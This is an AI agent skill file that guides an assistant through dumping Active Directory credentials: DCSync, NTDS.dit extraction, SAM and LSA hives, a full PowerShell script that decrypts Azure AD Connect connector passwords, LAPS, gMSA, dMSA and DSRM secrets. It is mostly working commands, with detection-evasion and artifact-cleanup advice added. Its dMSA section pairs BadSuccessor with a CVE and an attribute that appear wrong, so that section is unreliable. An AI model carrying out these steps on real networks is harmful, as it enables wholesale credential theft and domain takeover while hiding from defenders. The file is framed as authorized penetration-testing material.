---
name: credential-dumping
description: >
  Extracts credentials from Active Directory: DCSync replication, NTDS.dit
  database extraction, SAM hive dump, Azure AD Connect (ADSync) credential
  extraction, LAPS passwords (legacy + Windows LAPS), gMSA passwords (KDS
  root key + GoldenGMSA), dMSA exploitation (BadSuccessor CVE-2025-21293),
  and DSRM credentials.
keywords:
  - DCSync
  - secretsdump
  - NTDS.dit
  - ntds extraction
  - SAM dump
  - Azure AD Connect
  - ADSync
  - AAD Connect
  - mcrypt
  - DPAPI
  - LAPS password
  - gMSA password
  - dMSA
  - BadSuccessor
  - DSRM
  - credential dump
  - extract hashes
  - domain hashes
  - krbtgt hash
  - hashdump
  - GoldenGMSA
  - KDS root key
  - dump credentials
  - dump domain
tools:
  - secretsdump.py
  - mimikatz
  - netexec
  - bloodyAD
  - gMSADumper
  - sqlcmd
opsec: medium
---

# Credential Dumping

You are helping a penetration tester extract credentials from Active
Directory stores including domain databases, local machine hives, Azure AD
Connect sync databases, managed service accounts, and directory recovery
secrets. All testing is under explicit written authorization.

**Kerberos-first authentication**: All remote credential extraction
commands use Kerberos authentication (`-k -no-pass`, `--use-kcache`)
to avoid NTLM detection signatures. Exception: local filesystem operations
(SAM/NTDS extraction from hives) where Kerberos auth does not apply.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[credential-dumping] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Access level varies by technique (see Step 1)
- Tools: `secretsdump.py` (Impacket), `netexec` (nxc), optionally
  `mimikatz`, `bloodyAD`, `gMSADumper.py`, `ntdsutil.exe`

**Kerberos-first workflow** (for remote extraction):

```bash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
# or with password
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL
export KRB5CCNAME=user.ccache

# All extraction commands use -k -no-pass
secretsdump.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
```

## Step 1: Assess Access Level

Determine what you can extract based on current access:

| Access Level | Available Techniques | Go To |
|-------------|---------------------|-------|
| Replication rights (DS-Replication-Get-Changes + Get-Changes-All) | DCSync | Step 2 |
| Domain Admin / DC local admin | DCSync, NTDS extraction, LAPS, gMSA | Step 2 or 3 |
| Azure AD Connect admin (ADSyncAdmins, Azure Admins, or shell on AADConnect host) | ADSync credential extraction | Step 2b |
| Local admin on target | SAM dump | Step 4 |
| LAPS read permission (on computer object) | LAPS password read | Step 5 |
| gMSA read permission (PrincipalsAllowedToRetrieve) | gMSA password | Step 6 |
| GenericWrite on dMSA | dMSA BadSuccessor | Step 7 |
| DC local admin + DSRM knowledge | DSRM credential extraction | Step 8 |

### Check Replication Rights

```bash
# Check if current user has replication rights
bloodyAD -k -no-pass get writable --right 'REPLICATION' --detail

# Verify via secretsdump (attempt DCSync for a single account)
secretsdump.py -k -no-pass -just-dc-user krbtgt DOMAIN/user@DC.DOMAIN.LOCAL
```

## Step 2: DCSync (Replication)

Extract credentials by simulating domain controller replication. Requires
`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights
(held by Domain Admins, Enterprise Admins, DC machine accounts, and
accounts with these rights explicitly granted).

### Full Domain Dump

```bash
# Extract ALL domain hashes (users, machines, krbtgt)
secretsdump.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL

# Output format: user:rid:lmhash:nthash:::
# Also extracts: Kerberos keys (AES256, AES128), cleartext (if reversible)
```

### Targeted DCSync (Lower OPSEC)

```bash
# Single user (e.g., krbtgt for Golden Ticket)
secretsdump.py -k -no-pass -just-dc-user krbtgt \
  DOMAIN/user@DC.DOMAIN.LOCAL

# Specific high-value account
secretsdump.py -k -no-pass -just-dc-user Administrator \
  DOMAIN/user@DC.DOMAIN.LOCAL

# Only NTLM hashes (skip Kerberos keys, cleartext)
secretsdump.py -k -no-pass -just-dc-ntlm DOMAIN/user@DC.DOMAIN.LOCAL
```

### NetExec DCSync

```bash
# Check if DCSync is possible
nxc smb DC.DOMAIN.LOCAL --use-kcache -M dcsync

# Full dump via NetExec
nxc smb DC.DOMAIN.LOCAL --use-kcache --ntds
```

### Mimikatz DCSync (Windows)

```
# Single user
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# All users
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

### OPSEC Notes

- Generates **Event 4662** (directory service access) with replication GUIDs
- Generates **Event 4928/4929** (replication source/destination)
- Targeted DCSync (single user) generates fewer events than full dump
- CrowdStrike detects DCSync via replication GUID patterns

## Step 2b: Azure AD Connect (ADSync) Credential Extraction

Extract credentials stored in the Azure AD Connect synchronization database.
The ADSync database contains encrypted connector account passwords — the
on-premises AD connector typically runs as a high-privilege domain account
(often Domain Admin or an account with DCSync rights) to sync password
hashes to Azure AD.

### When to Use

- Azure AD Connect is installed (look for `ADSync` service, `AAD_` prefixed
  service accounts, or `Microsoft Azure AD Sync` in Program Files)
- You have a shell on the host running Azure AD Connect (usually the DC)
- Your user is a member of `ADSyncAdmins`, `Azure Admins`, or has local
  admin on the AADConnect host

### Indicators of Azure AD Connect

- Service account named `AAD_<hex>` or `MSOL_<hex>` in domain users
- `ADSync` or `ADSync2019` Windows service running
- `C:\Program Files\Microsoft Azure AD Sync\` directory exists
- Port 1433 (SQL Server) or LocalDB instance with `ADSync` database

### Step 1: Locate the ADSync Database

The ADSync database runs on either a full SQL Server instance or LocalDB.
Try SQL Server first — LocalDB is often inaccessible from WinRM sessions.

```powershell
# Check for ADSync service
Get-Service | Where-Object {$_.Name -like '*ADSync*'}

# Check install directory
ls "C:\Program Files\Microsoft Azure AD Sync\Bin"

# Try full SQL Server instance (use hostname as server name)
sqlcmd -S HOSTNAME -Q "SELECT name FROM sys.databases" -E
# Look for 'ADSync' in the output

# If full SQL Server fails, try LocalDB instances
sqlcmd -S "(localdb)\.ADSync" -Q "SELECT name FROM sys.databases" -E
sqlcmd -S "(localdb)\.ADSync2019" -Q "SELECT name FROM sys.databases" -E
sqlcmd -S "(localdb)\MSSQLLocalDB" -Q "SELECT name FROM sys.databases" -E
```

**Common issue:** LocalDB instances often fail from WinRM sessions due to
user profile and named pipe access restrictions. Full SQL Server instances
work reliably. If all SQL access fails, check the ADSync configuration file
for the connection string:

```powershell
type "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf"
# or check the config
type "C:\ProgramData\ADSync\Configuration\Exported-ServerConfiguration.xml"
```

### Step 2: Extract Encrypted Credentials

Query the ADSync database for connector configurations and keying material:

```powershell
# Get connector names and encrypted configurations
sqlcmd -S HOSTNAME -d ADSync -E -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent"

# Get DPAPI keying material
sqlcmd -S HOSTNAME -d ADSync -E -Q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
```

The `private_configuration_xml` column contains the connector type and
target domain. The `encrypted_configuration` column contains the
Base64-encoded encrypted password.

### Step 3: Decrypt with mcrypt.dll

The ADSync installation includes `mcrypt.dll` which provides DPAPI-based
decryption. The decryption workflow uses the `KeyManager` class to load
the keyset, retrieve the active credential key, and decrypt the encrypted
configuration.

**Upload this script to the target and execute it:**

```powershell
# decrypt_adsync.ps1 — Azure AD Connect credential extraction
# Requires: shell on ADSync host, SQL access to ADSync database

# Load the mcrypt assembly
Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

# Get keying material from ADSync database
$sqlServer = $env:COMPUTERNAME  # adjust if SQL is on a different host
$results = @()
$conn = New-Object System.Data.SqlClient.SqlConnection
$conn.ConnectionString = "Server=$sqlServer;Database=ADSync;Integrated Security=True"
$conn.Open()

# Get keyset info
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# Get encrypted connector configs
$cmd2 = $conn.CreateCommand()
$cmd2.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent"
$reader2 = $cmd2.ExecuteReader()

while ($reader2.Read()) {
    $config = $reader2.GetString(0)
    $encrypted = $reader2.GetString(1)

    # Initialize KeyManager and load keyset
    $km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)

    # Decrypt
    $plaintext = $null
    $key.DecryptBase64ToString($encrypted, [ref]$plaintext)

    # Extract domain and username from private config
    $domain = ([xml]$config).SelectSingleNode("//parameter[@name='forest-login-domain']").text
    $username = ([xml]$config).SelectSingleNode("//parameter[@name='forest-login-user']").text

    if (-not $username) {
        # AAD connector uses different XML structure
        $username = "AAD Connector"
        $domain = "Azure AD"
    }

    Write-Host "Domain:   $domain"
    Write-Host "Username: $username"
    Write-Host "Password: $plaintext"
    Write-Host "---"
}
$reader2.Close()
$conn.Close()
```

**Upload and execute via evil-winrm:**

```
# evil-winrm session
upload /path/to/decrypt_adsync.ps1
powershell -ExecutionPolicy Bypass -File .\decrypt_adsync.ps1
```

**Important — evil-winrm upload syntax:** Use `upload <local_path>` without
specifying a remote destination path. evil-winrm uploads to the current
working directory. Specifying a full Windows path as the destination can
cause path mangling (e.g., `C:Users...` instead of `C:\Users\...`).

### Common Failures and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `LoadKeySet` is not static | Called as `[KeyManager]::LoadKeySet()` | Instantiate: `$km = New-Object ...KeyManager; $km.LoadKeySet(...)` |
| Wrong argument count for `GetActiveCredentialKey` | Passed extra params | Takes 1 param only: `$km.GetActiveCredentialKey([ref]$key)` |
| Null-conditional operator `?.` error | PowerShell 5.1 (Server 2016/2019) | Use `if ($x) { $x.Property }` instead of `$x?.Property` |
| MCrypt class not found | Wrong namespace | Full namespace: `Microsoft.DirectoryServices.MetadirectoryServices.Cryptography` |
| `Get-ADSyncConnector` COM class factory error | DCOM limitation in WinRM | Don't use the ADSync PowerShell module — use mcrypt.dll directly |
| LocalDB access denied | WinRM session lacks user profile context | Use full SQL Server instance (`HOSTNAME`) instead of `(localdb)\...` |
| SQL connection fails | ADSync uses named instance | Try `HOSTNAME\SQLEXPRESS`, `HOSTNAME\ADSync`, or check services for SQL instance name |

### What This Extracts

The ADSync database typically contains two connector accounts:

1. **On-premises AD connector** — domain account that syncs AD objects.
   Often runs as `DOMAIN\Administrator` or a service account with DCSync
   rights. **This is the high-value target.**
2. **AAD connector** — Azure AD tenant account used for cloud sync.
   Format: `Sync_HOSTNAME_<hex>@tenant.onmicrosoft.com`.

If the on-premises connector runs as a domain admin or has replication
rights, use the extracted cleartext password for DCSync (Step 2) to
extract all domain hashes.

### OPSEC Notes

- Requires uploading a PowerShell script to the target (artifact)
- SQL queries to ADSync database may be logged if SQL audit is enabled
- **Clean up uploaded scripts** after extraction:
  `Remove-Item .\decrypt_adsync.ps1 -Force`
- The extraction itself is a local database read — no network detection
  signatures
- Subsequent DCSync with extracted creds generates standard replication
  events (4662, 4928/4929)

## Step 3: NTDS Extraction (Offline)

Extract the NTDS.dit database file from a DC for offline hash extraction.
Requires filesystem access to the DC.

### Method A: VSS Shadow Copy

```bash
# Remote via Impacket (creates VSS, extracts NTDS + SYSTEM, cleans up)
secretsdump.py -k -no-pass -use-vss DOMAIN/user@DC.DOMAIN.LOCAL
```

```powershell
# Manual on DC via diskshadow
diskshadow.exe
> set context persistent nowriters
> add volume C: alias cdrive
> create
> expose %cdrive% Z:
> exit

# Copy NTDS.dit from shadow
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Cleanup
diskshadow.exe
> unexpose Z:
> delete shadows volume C:
> exit
```

### Method B: ntdsutil (Native Windows)

```powershell
# Install From Media (IFM) — creates ntds.dit + SYSTEM hive
ntdsutil.exe "ac i ntds" "ifm" "create full C:\temp\ntds-backup" "quit" "quit"

# Files created:
# C:\temp\ntds-backup\Active Directory\ntds.dit
# C:\temp\ntds-backup\registry\SYSTEM
```

### Method C: Volume Shadow Copy (vssadmin)

```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Copy from shadow (use shadow copy ID from output)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Offline Hash Extraction

```bash
# Extract hashes from NTDS.dit + SYSTEM hive
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL

# Output: all domain users, machine accounts, krbtgt
# Format: user:rid:lmhash:nthash:::
```

### OPSEC Notes

- VSS creation generates **Event 8222** (shadow copy created)
- ntdsutil generates **Event 325** (database engine detached)
- File copy from shadow is logged if Sysmon is active
- Remote `-use-vss` via secretsdump auto-cleans but leaves brief artifacts
- Large NTDS.dit files take time to exfiltrate — consider DCSync instead

## Step 4: SAM Dump (Local Machine Hashes)

Extract local account hashes from the SAM registry hive.

### Remote SAM Dump

```bash
# Via secretsdump (extracts SAM + LSA secrets + cached domain creds)
secretsdump.py -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL

# NetExec SAM dump
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --sam

# NetExec LSA secrets (includes cached domain logon hashes)
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --lsa
```

### Manual SAM Extraction

```powershell
# Save registry hives (requires SYSTEM or local admin)
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security
```

```bash
# Extract hashes from saved hives
secretsdump.py -system system -sam sam -security security LOCAL
```

### What SAM Contains

- Local user accounts (Administrator RID 500, custom local accounts)
- Does NOT contain domain user hashes
- LSA secrets contain: cached domain logon hashes (DCC2), service
  account passwords, auto-logon credentials

## Step 5: LAPS Passwords

Read local admin passwords managed by LAPS from computer objects in AD.

### Legacy LAPS (ms-Mcs-AdmPwd)

Plaintext password stored in `ms-Mcs-AdmPwd` attribute. Readable by
accounts with explicit read permission on the attribute.

```bash
# NetExec LAPS module (reads both legacy and Windows LAPS)
nxc ldap DC.DOMAIN.LOCAL --use-kcache --laps

# bloodyAD (Kerberos-first)
bloodyAD -k -no-pass get object 'TARGET$' --attr ms-Mcs-AdmPwd

# Impacket Get-LAPSPassword (if available)
Get-LAPSPassword.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
```

```powershell
# PowerView
Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd

# Native AD module
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
```

### Windows LAPS (2023+ / KB5025229)

New attributes: `msLAPS-Password`, `msLAPS-EncryptedPassword`,
`msLAPS-PasswordExpirationTime`. Encrypted passwords require DPAPI
decryption or authorized read access.

```bash
# NetExec reads Windows LAPS automatically
nxc ldap DC.DOMAIN.LOCAL --use-kcache --laps

# bloodyAD (reads encrypted + decrypts if authorized)
bloodyAD -k -no-pass get object 'TARGET$' --attr msLAPS-Password
bloodyAD -k -no-pass get object 'TARGET$' --attr msLAPS-EncryptedPassword
```

```powershell
# Native cmdlet (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText
```

### Find LAPS-Managed Computers

```bash
# Find computers with LAPS attributes set
bloodyAD -k -no-pass get search --filter '(ms-Mcs-AdmPwdExpirationTime=*)' \
  --attr sAMAccountName,ms-Mcs-AdmPwd

# Find who can read LAPS passwords
bloodyAD -k -no-pass get writable --right 'READ' \
  --filter '(ms-Mcs-AdmPwdExpirationTime=*)' --detail
```

### OPSEC Notes

- Legacy LAPS read is an LDAP query — **very low OPSEC**
- No authentication events generated beyond normal LDAP bind
- Some organizations audit reads on `ms-Mcs-AdmPwd` via AD ACL auditing
- Windows LAPS encrypted passwords require authorized decryption context

## Step 6: gMSA Passwords

Extract Group Managed Service Account passwords.

### Read gMSA Password (Authorized Principal)

If your account is in `PrincipalsAllowedToRetrieveManagedPassword`:

```bash
# NetExec gMSA module
nxc ldap DC.DOMAIN.LOCAL --use-kcache --gmsa

# bloodyAD
bloodyAD -k -no-pass get object 'gMSA_ACCOUNT$' \
  --attr msDS-ManagedPassword

# gMSADumper
python3 gMSADumper.py -k -no-pass -d DOMAIN.LOCAL
```

```powershell
# PowerShell (DSInternals)
$gmsa = Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$mp.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText
```

### Find gMSA Accounts and Authorized Readers

```bash
# Find all gMSA accounts
bloodyAD -k -no-pass get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName,msDS-GroupMSAMembership

# Check who can read the password
bloodyAD -k -no-pass get object 'gMSA_ACCOUNT$' \
  --attr msDS-GroupMSAMembership
```

### GoldenGMSA (Persistence via KDS Root Key)

If you have Domain Admin access, extract the KDS root key to compute
any gMSA password offline — even after password rotation.

```bash
# Extract KDS root key
bloodyAD -k -no-pass get object \
  "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=domain,DC=local" \
  --attr msKds-RootKeyData

# Compute gMSA password from KDS key (GoldenGMSA technique)
# Requires: KDS root key + gMSA SID + managed password ID
python3 GoldenGMSA.py compute --sid S-1-5-21-...-1234 \
  --kds-key BASE64_KDS_KEY
```

### OPSEC Notes

- Authorized gMSA password read is normal operation — **low OPSEC**
- KDS root key extraction requires DA and generates Event 4662
- GoldenGMSA persists across password rotations (computed offline)

## Step 7: dMSA Exploitation (BadSuccessor — CVE-2025-21293)

Delegated Managed Service Accounts (dMSA) can be exploited via the
successor mechanism. Writing `msDS-ManagedPasswordId` on a dMSA allows
the attacker's account to retrieve the managed password.

### Prerequisites

- GenericWrite or WriteProperty on a dMSA object
- dMSA feature enabled (Windows Server 2025+)

### Enumeration

```bash
# Find dMSA accounts
bloodyAD -k -no-pass get search \
  --filter '(objectClass=msDS-DelegatedManagedServiceAccount)' \
  --attr sAMAccountName,msDS-ManagedPasswordId

# Check write permissions on dMSA
bloodyAD -k -no-pass get writable \
  --filter '(objectClass=msDS-DelegatedManagedServiceAccount)' --detail
```

### Exploitation

```bash
# Set attacker as successor (requires GenericWrite on dMSA)
bloodyAD -k -no-pass set object 'dMSA_ACCOUNT$' \
  msDS-ManagedPasswordId -v ATTACKER_MACHINE_SID

# Read the managed password
bloodyAD -k -no-pass get object 'dMSA_ACCOUNT$' \
  --attr msDS-ManagedPassword
```

```powershell
# PowerShell variant
Set-ADObject -Identity "CN=dMSA_ACCOUNT,CN=Managed Service Accounts,DC=domain,DC=local" `
  -Replace @{'msDS-ManagedPasswordId'=$attackerSID}
```

### OPSEC Notes

- **HIGH OPSEC** — object modification generates Event 5136
- dMSA is a new feature (Server 2025+) — limited deployment currently
- Patch status should be verified — CVE-2025-21293 may be patched

## Step 8: DSRM Credentials

Extract the Directory Services Restore Mode password from a DC.
Used for offline DC recovery — provides local Administrator access
to the DC when booted in DSRM.

### Check DSRM Logon Behavior

```powershell
# 0 = only in DSRM boot (default), 2 = always available for network logon
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior
```

### Extract DSRM Hash

```bash
# Via secretsdump (extracts LSA secrets including DSRM)
secretsdump.py -k -no-pass DOMAIN/admin@DC.DOMAIN.LOCAL

# From saved hives
secretsdump.py -system SYSTEM -security SECURITY LOCAL
```

```
# Mimikatz (on DC)
lsadump::lsa /patch
# Shows DSRM Administrator hash
```

### Use DSRM for DC Access

If `DsrmAdminLogonBehavior = 2`:

```bash
# Authenticate to DC using DSRM hash (local auth)
secretsdump.py -hashes :DSRM_HASH 'DC_HOSTNAME/Administrator@DC_IP'
```

### OPSEC Notes

- DSRM hash extraction requires DC local admin
- Changing DsrmAdminLogonBehavior to 2 is a persistence technique
- Event 4657 (registry value modified) if changing logon behavior

## Step 9: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### DCSync Fails with "Access Denied"

- Verify replication rights: `bloodyAD -k -no-pass get writable --right 'REPLICATION'`
- Only Domain Admins, Enterprise Admins, and DC machine accounts have
  replication rights by default
- Escalate (WriteDACL) to grant yourself replication rights

### secretsdump Errors with "Remote Operations Failed"

- Target may require SMB3, add `-smb2support` or check Impacket version
- Try `-use-vss` flag for VSS-based extraction instead of DRSUAPI
- Clock skew (`KRB_AP_ERR_SKEW`): **Clock Skew Interrupt** — stop immediately
  and return to the orchestrator. Do not retry or fall back to NTLM. Fix
  requires root: `sudo ntpdate DC_IP`

### LAPS Attribute Empty

- Computer may not be LAPS-managed (no GPO applied)
- Password may have expired and not yet rotated
- Your account lacks read permission on ms-Mcs-AdmPwd
- Windows LAPS encrypted passwords need authorized decryption context

### gMSA Password Returns Empty Blob

- Your account is not in `PrincipalsAllowedToRetrieveManagedPassword`
- gMSA password interval has not elapsed since account creation
- Try with DA credentials or find an authorized reader

### GPP Passwords (Legacy — MS14-025)

Group Policy Preferences stored encrypted passwords in SYSVOL. Microsoft
published the AES key, making all GPP passwords trivially decryptable:

```bash
# Automated extraction
Get-GPPPassword.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_password
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_autologin

# Manual search
findstr /S /I cpassword \\DOMAIN.LOCAL\SYSVOL\DOMAIN.LOCAL\Policies\*.xml
```

### OPSEC Comparison

| Technique | OPSEC | Detection Events | Notes |
|-----------|-------|-----------------|-------|
| DCSync (targeted) | **MEDIUM** | 4662 (replication GUIDs) | Single user = fewer events |
| DCSync (full domain) | **MEDIUM** | 4662, 4928/4929 | Many replication events |
| NTDS extraction (VSS) | **HIGH** | 8222 (VSS), file access | Large file exfiltration |
| NTDS (ntdsutil) | **HIGH** | 325, process creation | Native tool but noisy |
| Azure AD Connect | **LOW-MEDIUM** | SQL query, file upload | Local DB read, script artifact on disk |
| SAM dump (remote) | **MEDIUM** | 4624, registry access | Standard admin operation |
| LAPS read (legacy) | **LOW** | LDAP query only | Normal directory read |
| LAPS read (Windows) | **LOW** | LDAP + decryption | Authorized operation |
| gMSA read | **LOW** | LDAP query | Normal if authorized |
| GoldenGMSA (KDS) | **MEDIUM** | 4662 (KDS access) | DA required |
| dMSA BadSuccessor | **HIGH** | 5136 (object modify) | New attack surface |
| DSRM extraction | **HIGH** | LSA access | Requires DC access |
| GPP passwords | **LOW** | SMB share access | Read-only SYSVOL |
